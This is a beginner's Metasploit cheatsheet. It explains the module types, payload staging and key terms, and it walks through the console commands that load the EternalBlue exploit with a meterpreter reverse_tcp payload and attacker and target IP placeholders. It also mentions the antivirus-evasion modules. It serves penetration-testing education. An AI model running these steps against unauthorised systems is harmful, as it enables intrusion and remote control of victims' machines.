# Metasploit Framework - Beginner Friendly Cheatsheet

## 🔧 What is Metasploit?

---

Metasploit is a powerful framework used by ethical hackers and penetration testers to:

Scan for vulnerabilities

Exploit systems

Gain remote access

Perform post-exploitation actions

You interact with Metasploit through the terminal using the command:
```
msfconsole
```
## 📦 Types of Metasploit Modules

---

Modules are building blocks of Metasploit, each serving a specific purpose:

1. Exploit

Code that takes advantage of a vulnerability.

Path:``` modules/exploits/```

2. Payload

Code executed on the target after exploitation (e.g., open shell, add user).

Path: ```modules/payloads/```

3. Auxiliary

Extra tools like scanners, brute-forcers, and information gatherers.

Path:``` modules/auxiliary/```

4. Post

Used after successful exploitation (e.g., dumping hashes, privilege escalation).

Path:``` modules/post/```

5. Encoders

Obfuscate payloads to evade antivirus detection.

Path:``` modules/encoders/```

6. Evasion

Designed to bypass antivirus protections.

Path:``` modules/evasion/```

7. NOPs

No Operation instructions used as buffers in exploits.

Path:``` modules/nops/```

## 📂 Payload Types

---

Single (Inline)

All code is sent at once.

Example: ```generic/shell_reverse_tcp```

Staged

Sent in two parts:

Stager: sets up the connection

Stage: downloads the main payload

Example:``` windows/x64/shell/reverse_tcp```

# 🧰 Basic Metasploit Usage

---

Start Console

msfconsole

Search Exploits

search type:```exploit name:windows```

Use a Module

```use exploit/windows/smb/ms17_010_eternalblue```

Set Payload

```set payload windows/x64/meterpreter/reverse_tcp```

Set Target and Attacker IP

```set RHOST <target_ip>```
```set LHOST <your_ip>```

Run Exploit

```run```

## 🧠 Key Concepts

| Term        | Meaning                                 |
|-------------|-----------------------------------------|
| Exploit     | Code that abuses a system vulnerability |
| Payload     | Code executed after successful exploit  |
| Session     | Active connection to the victim         |
| Shell       | Command interface on the victim         |
| Meterpreter | Advanced interactive payload            |
| Auxiliary   | Non-exploit tools like scanners         |
| PostIP      | Post-exploitation actions               |
| LHOST       | Attacker machine IP                     |
| RHOST       | Victim machine                          |


----


> ⚠️ **Disclaimer:**  
> This cheatsheet is created **strictly for educational purposes**. Unauthorized access or misuse of any system is illegal. Always have explicit permission before testing or exploiting any device.

